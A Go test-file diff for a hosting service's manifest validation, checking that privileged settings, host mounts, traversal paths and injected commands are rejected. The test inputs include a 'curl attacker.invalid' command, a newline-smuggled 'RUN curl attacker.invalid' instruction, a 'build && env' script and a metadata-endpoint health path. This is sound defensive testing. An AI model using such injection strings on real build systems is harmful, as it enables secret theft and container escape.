@@ -2,11 +2,13 @@ package app
 
 import (
 	"bytes"
+	"context"
 	"crypto/hmac"
 	"crypto/sha256"
 	"database/sql"
 	"encoding/hex"
 	"encoding/json"
+	"fmt"
 	"net/http"
 	"net/http/httptest"
 	"path/filepath"
@@ -65,8 +67,12 @@ func signedManifestRequest(t *testing.T, token, externalProjectID string, manife
 	if err != nil {
 		t.Fatalf("encode manifest: %v", err)
 	}
-	timestamp := signedAt.Unix()
-	timestampText := itoa(timestamp)
+	return signedRawManifestRequest(t, token, externalProjectID, body, signedAt)
+}
+
+func signedRawManifestRequest(t *testing.T, token, externalProjectID string, body []byte, signedAt time.Time) *http.Request {
+	t.Helper()
+	timestampText := itoa(signedAt.Unix())
 	mac := hmac.New(sha256.New, []byte(token))
 	mac.Write([]byte(timestampText + "."))
 	mac.Write(body)
@@ -222,18 +228,114 @@ func TestInternalProjectProvisionRejectsArbitraryShellAndUnknownFields(t *testin
 	rec = httptest.NewRecorder()
 	handler.ServeHTTP(rec, req)
 	assertAPIErrorCode(t, rec, http.StatusBadRequest, errCodeInvalidManifest)
+
+	baseBody, err := json.Marshal(hostingProjectUpsertRequest{Manifest: validHostingManifest("node")})
+	if err != nil {
+		t.Fatal(err)
+	}
+	for field, value := range map[string]any{
+		"dockerfile":   "Dockerfile.customer",
+		"compose_file": "compose.yaml",
+		"host_path":    "/etc",
+		"host_mounts":  []string{"/:/host"},
+		"host_port":    443,
+		"privileged":   true,
+		"capabilities": []string{"SYS_ADMIN"},
+		"build_args":   map[string]string{"TOKEN": "plaintext"},
+		"environment":  map[string]string{"TOKEN": "plaintext"},
+		"command":      "curl attacker.invalid",
+	} {
+		t.Run(field, func(t *testing.T) {
+			var document map[string]any
+			if err := json.Unmarshal(baseBody, &document); err != nil {
+				t.Fatal(err)
+			}
+			manifestObject := document["manifest"].(map[string]any)
+			runtimeObject := manifestObject["runtime"].(map[string]any)
+			runtimeObject[field] = value
+			body, err := json.Marshal(document)
+			if err != nil {
+				t.Fatal(err)
+			}
+			request := signedRawManifestRequest(t, token.Token, "project_01JHOSTING", body, time.Now())
+			recorder := httptest.NewRecorder()
+			handler.ServeHTTP(recorder, request)
+			assertAPIErrorCode(t, recorder, http.StatusBadRequest, errCodeInvalidManifest)
+		})
+	}
+}
+
+func TestInternalProjectProvisionRejectsBadRequestEnvelopes(t *testing.T) {
+	withTempDB(t)
+	withHostingConfig(t)
+	token, err := createServiceToken("project-request-boundaries", []string{serviceScopeProjectsWrite})
+	if err != nil {
+		t.Fatal(err)
+	}
+	handler := serviceTokenAuthMiddleware(http.HandlerFunc(handleInternalAPI))
+	validBody, err := json.Marshal(hostingProjectUpsertRequest{Manifest: validHostingManifest("static")})
+	if err != nil {
+		t.Fatal(err)
+	}
+	tests := map[string]struct {
+		body   []byte
+		status int
+		code   string
+	}{
+		"oversized":       {body: bytes.Repeat([]byte(" "), maxManifestBodyBytes+1), status: http.StatusRequestEntityTooLarge, code: errCodePayloadTooLarge},
+		"malformed":       {body: []byte(`{"manifest":`), status: http.StatusBadRequest, code: errCodeInvalidManifest},
+		"multiple values": {body: append(append([]byte(nil), validBody...), []byte(` {}`)...), status: http.StatusBadRequest, code: errCodeInvalidManifest},
+	}
+	for name, testCase := range tests {
+		t.Run(name, func(t *testing.T) {
+			request := signedRawManifestRequest(t, token.Token, "project_01JREQBOUND", testCase.body, time.Now())
+			recorder := httptest.NewRecorder()
+			handler.ServeHTTP(recorder, request)
+			assertAPIErrorCode(t, recorder, testCase.status, testCase.code)
+			if recorder.Header().Get("Content-Type") != "application/json" {
+				t.Fatalf("error content type=%q", recorder.Header().Get("Content-Type"))
+			}
+		})
+	}
 }
 
 func TestHostingManifestValidationRejectsUnsupportedOrUnsafeFields(t *testing.T) {
 	tests := map[string]func(*hostingProjectUpsertRequest){
-		"unsupported runtime":  func(payload *hostingProjectUpsertRequest) { payload.Manifest.Runtime.Kind = "compose" },
-		"unsupported node":     func(payload *hostingProjectUpsertRequest) { payload.Manifest.Runtime.NodeVersion = "latest" },
-		"unsafe output":        func(payload *hostingProjectUpsertRequest) { payload.Manifest.Runtime.OutputDirectory = "../secrets" },
+		"unsupported schema":  func(payload *hostingProjectUpsertRequest) { payload.Manifest.SchemaVersion = "v2" },
+		"unsupported runtime": func(payload *hostingProjectUpsertRequest) { payload.Manifest.Runtime.Kind = "compose" },
+		"unsupported node":    func(payload *hostingProjectUpsertRequest) { payload.Manifest.Runtime.NodeVersion = "latest" },
+		"missing repository identity": func(payload *hostingProjectUpsertRequest) {
+			payload.Manifest.Repository.InstallationID = 0
+		},
+		"missing output directory": func(payload *hostingProjectUpsertRequest) {
+			payload.Manifest.Runtime.OutputDirectory = ""
+		},
+		"unsafe output": func(payload *hostingProjectUpsertRequest) { payload.Manifest.Runtime.OutputDirectory = "../secrets" },
+		"output instruction injection": func(payload *hostingProjectUpsertRequest) {
+			payload.Manifest.Runtime.OutputDirectory = "dist\nRUN curl attacker.invalid"
+		},
+		"output comment injection": func(payload *hostingProjectUpsertRequest) {
+			payload.Manifest.Runtime.OutputDirectory = "dist # ignored"
+		},
+		"output backslash": func(payload *hostingProjectUpsertRequest) {
+			payload.Manifest.Runtime.OutputDirectory = `dist\escape`
+		},
+		"output noncanonical": func(payload *hostingProjectUpsertRequest) {
+			payload.Manifest.Runtime.OutputDirectory = "dist/../public"
+		},
 		"repository as output": func(payload *hostingProjectUpsertRequest) { payload.Manifest.Runtime.OutputDirectory = "." },
 		"unsafe script":        func(payload *hostingProjectUpsertRequest) { payload.Manifest.Runtime.BuildScript = "build && env" },
 		"unsafe health": func(payload *hostingProjectUpsertRequest) {
 			payload.Manifest = validHostingManifest("node")
 			payload.Manifest.Runtime.HealthPath = "//metadata.internal"
+		},
+		"health path backslash": func(payload *hostingProjectUpsertRequest) {
+			payload.Manifest = validHostingManifest("node")
+			payload.Manifest.Runtime.HealthPath = `/health\escape`
+		},
+		"health path unicode": func(payload *hostingProjectUpsertRequest) {
+			payload.Manifest = validHostingManifest("node")
+			payload.Manifest.Runtime.HealthPath = "/héalth"
 		},
 		"invalid repository": func(payload *hostingProjectUpsertRequest) { payload.Manifest.Repository.FullName = "missing-owner" },
 	}
@@ -245,6 +347,30 @@ func TestHostingManifestValidationRejectsUnsupportedOrUnsafeFields(t *testing.T)
 				t.Fatal("expected manifest to be rejected")
 			}
 		})
+	}
+}
+
+func TestHostingManifestDigestUsesValidatedCanonicalValues(t *testing.T) {
+	withTempDB(t)
+	withHostingConfig(t)
+	canonical := validHostingManifest("static")
+	padded := canonical
+	padded.Repository.FullName = "  " + padded.Repository.FullName + "  "
+	padded.Runtime.Kind = " static "
+	padded.Runtime.NodeVersion = " 22 "
+	padded.Runtime.PackageManager = " npm "
+	padded.Runtime.BuildScript = " build "
+	padded.Runtime.OutputDirectory = " dist "
+	project, _, _, err := upsertHostingProject(t.Context(), "project_01JMANDIGEST", padded)
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, expectedDigest, err := manifestJSONAndDigest(canonical)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if project.ManifestDigest != expectedDigest || project.Manifest != canonical {
+		t.Fatalf("canonical manifest mismatch: digest=%q want=%q manifest=%+v", project.ManifestDigest, expectedDigest, project.Manifest)
 	}
 }
 
@@ -305,12 +431,57 @@ func TestHostingProjectUpsertIsConcurrentAndUnique(t *testing.T) {
 	}
 }
 
+func TestHostingProjectConcurrentDifferentManifestsReturnTransactionSnapshot(t *testing.T) {
+	withTempDB(t)
+	withHostingConfig(t)
+	manifests := []HostingProjectManifest{validHostingManifest("node"), validHostingManifest("node")}
+	manifests[1].ResourceProfile = "standard"
+	const workers = 32
+	var wait sync.WaitGroup
+	errs := make(chan error, workers)
+	for index := 0; index < workers; index++ {
+		manifest := manifests[index%len(manifests)]
+		_, expectedDigest, err := manifestJSONAndDigest(manifest)
+		if err != nil {
+			t.Fatal(err)
+		}
+		wait.Add(1)
+		go func() {
+			defer wait.Done()
+			project, _, _, err := upsertHostingProject(context.Background(), "project_01JMANIRACE", manifest)
+			if err != nil {
+				errs <- err
+				return
+			}
+			_, returnedDigest, err := manifestJSONAndDigest(project.Manifest)
+			if err != nil {
+				errs <- err
+				return
+			}
+			if project.ManifestDigest != expectedDigest || returnedDigest != expectedDigest {
+				errs <- fmt.Errorf("mixed manifest response: expected=%s field=%s body=%s", expectedDigest, project.ManifestDigest, returnedDigest)
+			}
+		}()
+	}
+	wait.Wait()
+	close(errs)
+	for err := range errs {
+		if err != nil {
+			t.Fatal(err)
+		}
+	}
+}
+
 func TestExternalIdentityConstraintsAndDeploymentReplay(t *testing.T) {
 	withTempDB(t)
 	withHostingConfig(t)
 	project, _, _, err := upsertHostingProject(t.Context(), "project_01JHOSTING", validHostingManifest("static"))
 	if err != nil {
 		t.Fatalf("provision project: %v", err)
+	}
+	secondProject, _, _, err := upsertHostingProject(t.Context(), "project_01JHOSTING2", validHostingManifest("static"))
+	if err != nil {
+		t.Fatalf("provision second project: %v", err)
 	}
 	now := formatSQLiteTime(time.Now())
 	if _, err := db.Exec(`INSERT INTO hosting_projects (external_project_id, manifest_version, manifest_json, manifest_digest, repository_installation_id, repository_id, repository_full_name, runtime_kind, resource_profile, repo_path, deploy_path, runner_id, created_at, updated_at) VALUES (?, 'v1', '{}', 'sha256:duplicate', 1, 2, 'owner/repo', 'static', 'starter', '/srv/repos/duplicate', '/srv/apps/duplicate', 0, ?, ?)`, project.ExternalProjectID, now, now); err == nil {
@@ -320,17 +491,17 @@ func TestExternalIdentityConstraintsAndDeploymentReplay(t *testing.T) {
 		t.Fatal("expected empty external_project_id check constraint")
 	}
 
-	insertDeployment := func(externalID string) error {
-		_, err := db.Exec(`INSERT INTO hosting_deployments (hosting_project_id, external_deployment_id, commit_sha, manifest_digest, artifact_digest, status, created_at, updated_at) VALUES (?, ?, ?, ?, ?, 'queued', ?, ?)`, project.ID, externalID, strings.Repeat("a", 40), project.ManifestDigest, "sha256:"+strings.Repeat("b", 64), now, now)
+	insertDeployment := func(projectID int64, externalID string) error {
+		_, err := db.Exec(`INSERT INTO hosting_deployments (hosting_project_id, external_deployment_id, commit_sha, manifest_digest, artifact_digest, status, created_at, updated_at) VALUES (?, ?, ?, ?, ?, 'failed', ?, ?)`, projectID, externalID, strings.Repeat("a", 40), project.ManifestDigest, "sha256:"+strings.Repeat("b", 64), now, now)
 		return err
 	}
-	if err := insertDeployment("deployment_01JHOSTING"); err != nil {
+	if err := insertDeployment(project.ID, "deployment_01JHOSTING"); err != nil {
 		t.Fatalf("insert external deployment: %v", err)
 	}
-	if err := insertDeployment("deployment_01JHOSTING"); err == nil {
+	if err := insertDeployment(secondProject.ID, "deployment_01JHOSTING"); err == nil {
 		t.Fatal("expected external_deployment_id unique constraint")
 	}
-	if err := insertDeployment(""); err == nil {
+	if err := insertDeployment(secondProject.ID, ""); err == nil {
 		t.Fatal("expected empty external_deployment_id check constraint")
 	}
 	if _, err := db.Exec(`INSERT INTO hosting_deployments (hosting_project_id, external_deployment_id, commit_sha, manifest_digest, artifact_digest, status, created_at, updated_at) VALUES (999999, 'deployment_01JFOREIGN', ?, ?, ?, 'queued', ?, ?)`, strings.Repeat("a", 40), project.ManifestDigest, "sha256:"+strings.Repeat("b", 64), now, now); err == nil {
